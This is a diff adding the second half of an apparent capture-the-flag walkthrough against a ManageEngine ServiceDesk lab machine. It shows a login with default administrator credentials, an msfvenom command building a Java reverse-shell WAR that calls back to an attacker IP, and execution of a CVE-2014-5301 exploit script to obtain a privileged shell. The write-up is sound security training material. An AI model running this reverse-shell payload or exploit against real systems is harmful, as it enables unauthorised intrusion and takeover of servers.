@@ -50,8 +50,44 @@ We now copy our payload into our downloaded exploit code, which we can edit usin
 
 ![](/static/img/screenshot-2024-07-24-at-11.55.49 am.png)
 
-We need to start a netcat listener on the attack machine so that the target can communicate with our attack machine:
+Now we have a ready exploit!  You can execute from there but we probably never needed to get here because there is an even easier way!
 
+Before executing that, let's go back to our other identified vulnerability on the webserver (why are we doing this: it always helps to have multiple attack surfaces!)
 
+Here is the lesson, always use Google and never forget to try default credentials!  Here, we know that the service used is ManageEngine Service desk.  So a simple Google search for default credentials reveals administrator:administrator!
 
-\-- COMING SOON ---
+![](/static/img/screenshot-2024-07-24-at-12.24.24 pm.png)
+
+And we are successfully into the service:
+
+![](/static/img/screenshot-2024-07-24-at-12.27.38 pm.png)
+
+We are authenticated, which increases our list of potential exploits.  Let's search using searchsploit to see what's out there:
+
+![](/static/img/screenshot-2024-07-24-at-12.42.35 pm.png)
+
+CVE-2014-5301 looks promising!
+
+![](/static/img/screenshot-2024-07-24-at-12.47.26 pm.png)
+
+We create a reverse shell package:
+
+`msfvenom -p java/shell_reverse_tcp LHOST=192.168.49.52 LPORT=4444 -f war > shell.war`
+
+Then download our exploit:
+
+![](/static/img/screenshot-2024-07-24-at-12.53.55 pm.png)
+
+And execute the exploit:
+
+`python3 CVE-2014-5301.py [target IP] 8080 administrator administrator shell.war`
+
+![](/static/img/screenshot-2024-07-24-at-12.59.21 pm.png)
+
+And we get a connection with a privileged shell on our listener window!
+
+![](/static/img/screenshot-2024-07-24-at-1.00.50 pm.png)
+
+Then we move to the Administrator's Desktop and find our flag.
+
+![](/static/img/screenshot-2024-07-24-at-1.02.27 pm.png)
